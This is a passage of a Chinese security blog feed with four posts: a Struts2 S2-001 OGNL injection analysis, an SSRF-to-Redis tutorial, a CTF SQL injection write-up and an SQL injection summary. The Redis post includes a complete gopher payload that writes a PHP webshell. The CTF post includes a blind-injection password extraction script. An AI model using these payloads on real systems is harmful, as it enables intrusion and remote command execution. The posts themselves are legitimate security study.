class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">translateVariables</span><span class="params">(<span class="keyword">char</span> open, String expression, ValueStack stack, Class asType, TextParseUtil.ParsedValueEvaluator evaluator)</span> </span>&#123;</span><br><span class="line">    Object result = expression;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(<span class="keyword">true</span>) &#123;</span><br><span class="line">        <span class="keyword">int</span> start = expression.indexOf(open + <span class="string">&quot;&#123;&quot;</span>);</span><br><span class="line">        <span class="keyword">int</span> length = expression.length();</span><br><span class="line">        <span class="keyword">int</span> x = start + <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">int</span> count = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(start != -<span class="number">1</span> &amp;&amp; x &lt; length &amp;&amp; count != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">char</span> c = expression.charAt(x++);</span><br><span class="line">            <span class="keyword">if</span> (c == <span class="string">&#x27;&#123;&#x27;</span>) &#123;</span><br><span class="line">                ++count;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (c == <span class="string">&#x27;&#125;&#x27;</span>) &#123;</span><br><span class="line">                --count;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> end = x - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (start == -<span class="number">1</span> || end == -<span class="number">1</span> || count != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> XWorkConverter.getInstance().convertValue(stack.getContext(), result, asType);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        String <span class="keyword">var</span> = expression.substring(start + <span class="number">2</span>, end);</span><br><span class="line">        Object o = stack.findValue(<span class="keyword">var</span>, asType);</span><br><span class="line">        <span class="keyword">if</span> (evaluator != <span class="keyword">null</span>) &#123;</span><br><span class="line">            o = evaluator.evaluate(o);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        String left = expression.substring(<span class="number">0</span>, start);</span><br><span class="line">        String right = expression.substring(end + <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (o != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (TextUtils.stringSet(left)) &#123;</span><br><span class="line">                result = left + o;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                result = o;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (TextUtils.stringSet(right)) &#123;</span><br><span class="line">                result = result + right;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            expression = left + o + right;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            result = left + right;</span><br><span class="line">            expression = left + right;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到改代码段是对expression的一个处理,而此时expression的值是**%{username}**</p><p>我们分析一下这段代码干了啥</p><p>可以看到32行处result=%{username}等等OGNL表达式就会解析这个%{}中的值(解析这个username),从而拿到到表单中username的值</p><p>进入34第一个while(true)</p><p>35行-38行设置了一堆flag用来遍历%{username}</p><p>看到重点代码,第40行的while循环,在这个循环中如果遍历的字符串不是以%{开头的话,start会在35行被赋值为-1,如果遍历的字符串不是以}结尾或者字符串中没有成对的{}的话,count会为1</p><p>简单的概括一下,如果输入的字符串不是形如%{xxxx}的字符串,要么count为1,要么start为-1</p><p>有什么用呢?</p><p>在第50行,如果if的条件满足将进入第51行,也就是说如果输入的字符串不是形如%{xxx}的话就会进入51行,如果是的话就会往下进行.</p><p>我们这里执行第一次循环,输入的是%{username},经过一个循环后 start=0 count=0 end=10 不满足if条件,进入下面的继续执行</p><p>来到第55行,stack.findValue(var,asType)这个时候var=username也就是%{}中的值,将username当作表达式进行解析,而OGNL表达式解析跟对象的时候直接写名字就好了,所以跟进一下看看</p><img src="/2022/01/09/Struts2-S001%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220109192547701.png" class title="image-20220109192547701"><p>来到重点了,此时执行OgnlUtil.getValue(expr,this,context,this.root,asType)</p><p>前面说了,ognl的getvalue方法是可以执行代码的,只要expr为我们所控就可以,这里执行第一次解析,得到value的值为%{2+2}(因为表单中username的值是%{2+2}这里解析出来了),到现在,我们的payload出现了.</p><p>我i们往下看一下</p><img src="/2022/01/09/Struts2-S001%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220109193719677.png" class title="image-20220109193719677"><p>执行完后返回,现在Object o的值为%{2+2},值的注意的是我们现在还是在translateVariables这个方法中的第一个死循环里面的,往下执行发现result已经被重新赋值了,变为了o</p><img src="/2022/01/09/Struts2-S001%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220109194435064.png" class title="image-20220109194435064"><p>继续往下执行便重新这一个过程了,此时的result为我们的%{2+2},我们的%{2+2}又会被当做ognl表达式进行解析,将字符串”2+2”传递到OgnlUtil.getValue(expr,this,context,this.root,asType)中进行计算</p><img src="/2022/01/09/Struts2-S001%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220109194830732.png" class title="image-20220109194830732">当执行到第三次循环时,此时o已经为4(注意32行),已经无法满足需求了,start已经为-1,会直接进入第51行,结束循环<img src="/2022/01/09/Struts2-S001%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220109194953004.png" class title="image-20220109194953004"><p>至此,整个过程已经清晰明了了,整个漏洞的核心就在于在translateVariables中反复对表达式进行解析,本来解析一层%{username}就可以了,但是开发者将username反复解析直到没有形如%{}的式子位置,那么就造成了注入,用户可控ognl的getvalue方法,从而导致执行任意命令</p><h1 id="0X04-解决刚刚发生的问题"><a href="#0X04-解决刚刚发生的问题" class="headerlink" title="0X04:解决刚刚发生的问题"></a>0X04:解决刚刚发生的问题</h1><p><strong>疑问1:为什么只有在return “error”的时候会复现成功而return “success”的时候不会呢?</strong></p><p>我么通过分析可以发现,整个漏洞的起点是由于调用了doEndTag和doStartTag,从而解析jsp中的表达式标签.</p><p>我们发出的请求-&gt;Struts2处理-&gt;处理完毕后将结果返回jsp,在这个过程中如果返回的jsp文件存在标签,而这个标签恰巧是能够被解析的</p><p>举个例子,index.jsp中存在标签</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;s:form action&#x3D;&quot;login&quot;&gt;</span><br><span class="line">    &lt;s:textfield name&#x3D;&quot;username&quot; label&#x3D;&quot;username&quot; &#x2F;&gt;</span><br><span class="line">    &lt;s:textfield name&#x3D;&quot;password&quot; label&#x3D;&quot;password&quot; &#x2F;&gt;</span><br><span class="line">    &lt;s:submit&gt;&lt;&#x2F;s:submit&gt;</span><br><span class="line">&lt;&#x2F;s:form&gt;</span><br></pre></td></tr></table></figure><p>而success.jsp中什么都没有,只有一个h1标签</p><p>我们的逻辑是如果返回error 那么就停留在index.jsp</p><p>如果是success,那么久进入success.jsp</p><p>这个停留在index.jsp的过程,就是触发漏洞的过程</p><p>我们发起请求-&gt;Struts2处理-&gt;发现输入不符合后端判断要求,返回error-&gt;通过查询struct.xml发现返回的error需要回到index.jsp-&gt;既然页面要回到index.jsp就需要重新渲染-&gt;<strong>发现index.jsp中存在标签</strong>-&gt;调用doEndTag,doStartTag方法去解析标签-&gt;刚好此时需要获取有一个名为username的表单,我们要呈现给用户(新的index.jsp),就要先去找他有没有对应的值,而这个值是可以通过ognl获取到的(ognl.getvalue)-&gt;通过ognl.getvalue获取到了值,如果是普通用户名就显示普通用户名,如果是恶意表达式就进行计算后将结果返回到username(这也是为什么执行算术运算会在username处得到回显的原因,如果执行java代码,那么返回的o会是一个null所以没有回显)-&gt;返回新的index.jsp</p><p>而网上大多数demo的success.jsp中并没有任何标签,只是一个提示信息(例如一个h标签),根本不会触发标签渲染,所以在”<strong>发现index.jsp中存在标签</strong>“这一步就直接断掉了,根本不会执行到doStartTag,doEndTag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言:&quot;&gt;&lt;/a&gt;前言:&lt;/h1&gt;&lt;p&gt;本篇文章是站在一个只会一丁点java基础,没有任何Java开发经验的的菜鸡眼中去完成的.所设计知识点繁多,杂乱,从Struts2的执行流</summary>
      
    
    
    
    
    <category term="-Java代码审计 -Struts2" scheme="http://example.com/tags/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Struts2/"/>
    
  </entry>
  
  <entry>
    <title>代码审计:信呼oa</title>
    <link href="http://example.com/2021/11/29/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BF%A1%E5%91%BCoa/"/>
    <id>http://example.com/2021/11/29/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BF%A1%E5%91%BCoa/</id>
    <published>2021-11-29T14:21:29.000Z</published>
    <updated>2022-01-27T11:02:30.814Z</updated>
    
    <content type="html"><![CDATA[<p>这个忘记写了,先留着…</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这个忘记写了,先留着…&lt;/p&gt;
</summary>
      
    
    
    
    
    <category term="代码审计" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>利用SSRF打Redis</title>
    <link href="http://example.com/2021/05/25/%E5%88%A9%E7%94%A8SSRF%E6%89%93Redis/"/>
    <id>http://example.com/2021/05/25/%E5%88%A9%E7%94%A8SSRF%E6%89%93Redis/</id>
    <published>2021-05-25T06:18:58.000Z</published>
    <updated>2022-01-27T11:05:10.231Z</updated>
    
    <content type="html"><![CDATA[<h2 id="SSRF-amp-Gopher协议"><a href="#SSRF-amp-Gopher协议" class="headerlink" title="SSRF&amp;Gopher协议"></a>SSRF&amp;Gopher协议</h2><p>最近研究通过Gopher协议构造post，get请求来攻击内网的一些服务。遂继续研究Gopher协议，Gopher协议不仅可以进行post，get请求的修改，还能构造TCP数据流攻击一些内网的服务。如redis，mysql等。这次分析通过SSRF和Gopher协议攻击redis，以及对攻击原理进行分析。</p><h2 id="未授权的Redis"><a href="#未授权的Redis" class="headerlink" title="未授权的Redis"></a>未授权的Redis</h2><p>未授权redis服务即不需要密码即可使用的redis服务，这种暴露在网络中而且不需要授权的服务非常危险，可以直接构造payload执行文件写入，反弹shell等危险操作。</p><p>安装redis后使用root用户启动。(手动关闭redis后重新使用redis-server命令启动，不然默是redis用户，没有文件写入权限)</p><p>使用工具生成payload，直接打。</p><img src="/2021/05/25/%E5%88%A9%E7%94%A8SSRF%E6%89%93Redis/image-20210526173523848.png" class title="image-20210526173523848"><img src="/2021/05/25/%E5%88%A9%E7%94%A8SSRF%E6%89%93Redis/image-20210526173631918.png" class title="image-20210526173631918"><p>成功写入：</p><img src="/2021/05/25/%E5%88%A9%E7%94%A8SSRF%E6%89%93Redis/image-20210526173829701.png" class title="image-20210526173829701"><h2 id="流量包分析"><a href="#流量包分析" class="headerlink" title="流量包分析"></a>流量包分析</h2><p>抓出攻击流量包进行流量分析</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -i eth0 port 6379 -W 1234.pcap</span><br></pre></td></tr></table></figure><img src="/2021/05/25/%E5%88%A9%E7%94%A8SSRF%E6%89%93Redis/image-20210526174018926.png" class title="image-20210526174018926"><p>流量包结构如上，redis使用了RESP协议进行通信的。该协议内容如下：</p><img src="/2021/05/25/%E5%88%A9%E7%94%A8SSRF%E6%89%93Redis/image-20210526174236185.png" class title="image-20210526174236185"><p>截取了流量包前半部分分条解析RESP协议</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">*1&#x2F;&#x2F;接下来将会有1个数组数据</span><br><span class="line">$8&#x2F;&#x2F;数组的第0为，长度为8</span><br><span class="line">flushall&#x2F;&#x2F;长度8的数据</span><br><span class="line">*3&#x2F;&#x2F;接下来将会有3个数组的数据</span><br><span class="line">$3&#x2F;&#x2F;数组的第0位，长度为3</span><br><span class="line">set&#x2F;&#x2F;长度为3的数据</span><br><span class="line">$1&#x2F;&#x2F;数组的第一位，长度为1</span><br><span class="line">1&#x2F;&#x2F;长度为1的数据</span><br><span class="line">$22&#x2F;&#x2F;数组的第二位，长度为22</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;?php phpinfo();?&gt;&#x2F;&#x2F;长度为22的数据</span><br></pre></td></tr></table></figure><p>可以看到，如果我要发送一个字符串flushall到redis,就得进行如下编码。</p><p>*1\r\n$8\r\nflushall\r\n</p><p>*1,$8,flushall都是协议的不同部分，所以他们之前都需要使用CRLF(\r\n)进行分割</p><h2 id="Redis授权访问"><a href="#Redis授权访问" class="headerlink" title="Redis授权访问"></a>Redis授权访问</h2><p>既然Redis可以通过RESP协议进行通信，那我们只要解析出redis登录的时候发送的报文，那么就可以在知道密码的情况下使用gopher协议进行攻击或者攥写脚本进行简单的密码爆破。</p><p>首先抓包分析redis登录过程</p><img src="/2021/05/25/%E5%88%A9%E7%94%A8SSRF%E6%89%93Redis/image-20210526205022005.png" class title="image-20210526205022005"><p>可以看到登录过程中发送的报文，auth字段后面跟密码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">*2</span><br><span class="line">$4</span><br><span class="line">auth</span><br><span class="line">$6</span><br><span class="line">123456</span><br></pre></td></tr></table></figure><p>而且，redis支持管道操作，可以通过单个写入操作发送多个命令，不需要再发出下一个命令之前读取上一个命令服务器的恢复。所有的回复都可以在最后阅读。所以，即使redis存在认证同样可以进行攻击。在刚刚的未授权数据包前加上授权字段即可以正常攻击</p><p>我们重新在payload前加上我们编码过的满足gopher协议的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%2A2%0D%0A%244%0D%0Aauth%0D%0A%246%0D%0A123456%0D%0A</span><br></pre></td></tr></table></figure><p>最终payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gopher:&#x2F;&#x2F;127.0.0.1:6379&#x2F;_%2A2%0D%0A%244%0D%0Aauth%0D%0A%246%0D%0A123456%0D%0A%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2434%0D%0A%0A%0A%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A&#x2F;var&#x2F;www&#x2F;html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>攻击成功：</p><img src="/2021/05/25/%E5%88%A9%E7%94%A8SSRF%E6%89%93Redis/image-20210526212140660.png" class title="image-20210526212140660"><p>流量细节：</p><img src="/2021/05/25/%E5%88%A9%E7%94%A8SSRF%E6%89%93Redis/image-20210526212317184.png" class title="image-20210526212317184"><p>既然可以通过构造验证包进行请求，redis速度也非常快，那么一些不太安全的密码可能会存在被暴力破解的可能。本篇文章在这方面不做研究。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;SSRF-amp-Gopher协议&quot;&gt;&lt;a href=&quot;#SSRF-amp-Gopher协议&quot; class=&quot;headerlink&quot; title=&quot;SSRF&amp;amp;Gopher协议&quot;&gt;&lt;/a&gt;SSRF&amp;amp;Gopher协议&lt;/h2&gt;&lt;p&gt;最近研究通过Goph</summary>
      
    
    
    
    
    <category term="SSRF" scheme="http://example.com/tags/SSRF/"/>
    
    <category term="Redis" scheme="http://example.com/tags/Redis/"/>
    
  </entry>
  
  <entry>
    <title>美团CTF 2021 web writeup</title>
    <link href="http://example.com/2021/05/23/%E7%BE%8E%E5%9B%A2CTF-2021-web-writeup/"/>
    <id>http://example.com/2021/05/23/%E7%BE%8E%E5%9B%A2CTF-2021-web-writeup/</id>
    <published>2021-05-23T05:55:44.000Z</published>
    <updated>2022-01-27T11:01:47.812Z</updated>
    
    <content type="html"><![CDATA[<h1 id="web1-sql"><a href="#web1-sql" class="headerlink" title="web1 sql"></a>web1 sql</h1><img src="/2021/05/23/%E7%BE%8E%E5%9B%A2CTF-2021-web-writeup/image-20210523140458925.png" class title="image-20210523140458925"><p>登录页面，首先fuzz测试一下过滤关键字。</p><img src="/2021/05/23/%EF%BF%BD%EF%BF%BDCTF-2021-web-writeup/S_86%25%5D%5D_@2HOM8H%7DYNO%7DLT1.png" class title="img"><p>过滤了select ascii substr if 各种比较，引号。而开放了regexp，/**/等特殊字段。不考虑bool盲注，时间盲注。考虑</p><p>regexp正则盲注，关于正则盲注可以去我的sql总结中看。</p><p>思路：正则盲注，使用16进制编码绕过引号限制，使用/**/绕过空格限制。使用||绕过OR限制，而\用来转义引号从而使其闭合。</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;admin\&amp;password&#x3D;||password&#x2F;**&#x2F;regexp&#x2F;**&#x2F;0x5e542a#</span><br></pre></td></tr></table></figure><p>脚本Python3：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;eci-2ze10cbxg19yyr2ee727.cloudeci1.ichunqiu.com&#x2F;&quot;</span><br><span class="line">ALLSTR &#x3D; string.ascii_lowercase+string.ascii_uppercase+string.digits+&quot;_&quot;</span><br><span class="line">password &#x3D; &#39;&#39;</span><br><span class="line">hexs &#x3D; &#39;&#39;</span><br><span class="line">for a in range(0,50):</span><br><span class="line">    for i in ALLSTR:</span><br><span class="line">        data &#x3D; &#123;&#39;username&#39;: &quot;admin\\&quot;, &#39;password&#39;: &#39;||password&#x2F;**&#x2F;regexp&#x2F;**&#x2F;BINARY&#x2F;**&#x2F;0x5E&#39; +hexs+hex(ord(i))[2:4] + &quot;#&quot;&#125;</span><br><span class="line">        result &#x3D; requests.post(url&#x3D;url,data&#x3D;data)</span><br><span class="line">        # print(data)</span><br><span class="line">        if &quot;flag&quot; in result.text:</span><br><span class="line">            password &#x3D; password + i</span><br><span class="line">            hexs &#x3D; hexs+hex(ord(i))[2:4]</span><br><span class="line">            print(&quot;password is &quot; + password)</span><br><span class="line">            print(hexs)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>result：</p><img src="/2021/05/23/%E7%BE%8E%E5%9B%A2CTF-2021-web-writeup/image-20210523144241415.png" class title="image-20210523144241415"><p>用户名admin，密码This_1s_thE_Passw0rd登录getflag</p><img src="/2021/05/23/%E7%BE%8E%E5%9B%A2CTF-2021-web-writeup/image-20210523144419673.png" class title="image-20210523144419673">]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;web1-sql&quot;&gt;&lt;a href=&quot;#web1-sql&quot; class=&quot;headerlink&quot; title=&quot;web1 sql&quot;&gt;&lt;/a&gt;web1 sql&lt;/h1&gt;&lt;img src=&quot;/2021/05/23/%E7%BE%8E%E5%9B%A2CTF-2021-</summary>
      
    
    
    
    
    <category term="-CTF" scheme="http://example.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>常见SQL注入总结,原理分析</title>
    <link href="http://example.com/2021/05/19/%E5%B8%B8%E8%A7%81SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93-%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/"/>
    <id>http://example.com/2021/05/19/%E5%B8%B8%E8%A7%81SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93-%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/</id>
    <published>2021-05-19T03:27:08.000Z</published>
    <updated>2021-05-24T02:50:57.516Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="sql常见运算符，注释符。"><a href="#sql常见运算符，注释符。" class="headerlink" title="sql常见运算符，注释符。"></a>sql常见运算符，注释符。</h2><p>众所周知sql存在注入的本质是在代码层面sql语句存在拼接，过滤不严谨等，用户可以通过控制sql语句从而达到注入的目的。在进行sql总结时先总结下常见的sql符号。</p><h6 id="注释符"><a href="#注释符" class="headerlink" title="注释符"></a>注释符</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">单行注释</span><br><span class="line">#</span><br><span class="line">--</span><br><span class="line">多行注释</span><br><span class="line">&#x2F;*...*&#x2F;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h6 id="算数运算符"><a href="#算数运算符" class="headerlink" title="算数运算符"></a>算数运算符</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">算术运算符</span><br><span class="line">+(加)</span><br><span class="line">-(减)</span><br><span class="line">*(乘)</span><br><span class="line">&#x2F;(除)</span><br><span class="line">%(取模)</span><br></pre></td></tr></table></figure><h6 id="比较运算符"><a href="#比较运算符" class="headerlink" title="比较运算符"></a>比较运算符</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#x3D;(等于)</span><br><span class="line">&gt;(大于)</span><br><span class="line">&lt;(小于)</span><br><span class="line">&lt;&gt;(不等于)</span><br><span class="line">&gt;&#x3D;(大于等于)</span><br><span class="line">&lt;&#x3D;(小于等于)</span><br><span class="line">!&#x3D;(不等于)</span><br></pre></td></tr></table></figure><h6 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">AND(两边为真返回真)</span><br><span class="line">OR(两边为假返回假)</span><br><span class="line">NOT(对布尔表达式值取反)</span><br></pre></td></tr></table></figure><h2 id="False注入"><a href="#False注入" class="headerlink" title="False注入"></a>False注入</h2><p>为何叫False注入呢，是因为mysql存在隐式类型转换。抛开官方文档各种复杂的解释。最简单的就是mysql在进行比较运算的时候，如果将字符串与数字进行比较，就会将字符串进行类型进行转换，而这个转换会失败从而转为false。</p><p>举个栗子。</p><p>现在有个sql语句:select ‘a’ = false;</p><p>这个sql语句执行的时候’a’已经被转换为了false，所以’a’=false这个表达式成立返回真(1),所以表格里面的值为1。</p><img src="/2021/05/19/%E5%B8%B8%E8%A7%81SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93-%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20210520002831466.png" class title="image-20210520002831466"><p>而false又等于0，所以select ‘a’ = false等价于select ‘a’ = 0</p><img src="/2021/05/19/%E5%B8%B8%E8%A7%81SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93-%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20210520003208869.png" class title="image-20210520003208869"><p>有什么用呢？这里是select进行演示，而当我们用上where限定字段时，where A= B这个时候只要A是一个字符串，我们让B等于或者false，那么where条件就会恒成立。</p><p>举个栗子，现在有一个personinfo数据库如下：</p><img src="/2021/05/19/%E5%B8%B8%E8%A7%81SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93-%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20210520003620491.png" class title="image-20210520003620491"><p>我执行一个查询语句：select * from personinfo where pname = 0;</p><p>按理来说pname=0不存在的，而我们这pname为字符串，发生转换，转换失败变为false，false=0，条件成立。</p><img src="/2021/05/19/%E5%B8%B8%E8%A7%81SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93-%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20210520004049439.png" class title="image-20210520004049439"><p>值得注意的是，如果是以数字开头的字段进行转换，那么就会截取到数字结束的地方在进行转换，转换是成功的，结果是对应数字，所以应该使用无数字开头的字段进行False注入。</p><p>一些绕过姿势：</p><p>False注入的核心便是凑出’0’，想要凑出0有很多的方法，下面列举几个</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">^:异或两个字符串会变为0 eg：&#39;a&#39;^&#39;b&#39;&#x3D;0</span><br><span class="line">+,-,*:对两个字符串进行+,-,*操作会变为0  eg:&#39;a&#39;+&#39;b&#39;&#x3D;0</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="order-by-注入"><a href="#order-by-注入" class="headerlink" title="order by 注入"></a>order by 注入</h2><h6 id="结合union进行盲注"><a href="#结合union进行盲注" class="headerlink" title="结合union进行盲注"></a>结合union进行盲注</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user where username &#x3D; &#39;&#39;</span><br></pre></td></tr></table></figure><p>这是一条sql语句，执行用户名查询的。如果我们对其进行改造为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user where username &#x3D; &#39;&#39; or 1 union select &#39;a&#39;,2,3,4,5;</span><br></pre></td></tr></table></figure><img src="/2021/05/19/%E5%B8%B8%E8%A7%81SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93-%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20210520083149416.png" class title="image-20210520083149416"><p>可以看到select * from user where username = ‘’ or 1和select ‘a’,2,3,4,5的查询结果被整合起来了,’a’,2,3,4,5成为了新的数据存在了结果集中。</p><p>如果我们在后面加上orderby：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user where username &#x3D; &#39;&#39; or 1 union select &#39;a&#39;,2,3,4,5 order by 1;</span><br></pre></td></tr></table></figure><p>这里的1指的是第一列，按照第一列进行排序。</p><p>结果如下：</p><img src="/2021/05/19/%E5%B8%B8%E8%A7%81SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93-%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20210520083341878.png" class title="image-20210520083341878"><p>可以看到如果我们指定的列名’a’如果大于Admin便会直接被顶到前面去，可以控制列名来控制结果集。</p><h6 id="结合if进行盲注："><a href="#结合if进行盲注：" class="headerlink" title="结合if进行盲注："></a>结合if进行盲注：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">order by if(1&#x3D;1,1,sleep(1))</span><br><span class="line"></span><br><span class="line">select * from user order by if(1&#x3D;1,1,sleep(1));</span><br><span class="line"></span><br><span class="line">select * from user order by if(1&#x3D;2,1,sleep(1));</span><br></pre></td></tr></table></figure><img src="/2021/05/19/%E5%B8%B8%E8%A7%81SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93-%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20210520084159504.png" class title="image-20210520084159504"><p>可以看到第二次查询用了4秒，因为sleep(1)是根据数据条数来的，4条数据就会sleep4秒。</p><h2 id="Mysql文件读取"><a href="#Mysql文件读取" class="headerlink" title="Mysql文件读取"></a>Mysql文件读取</h2><p>在mysql中存在一个全局变量secure_file_priv，该变量用于控制数据的导入导出。例如LOAD_FILE(),SELECT ….. INTO 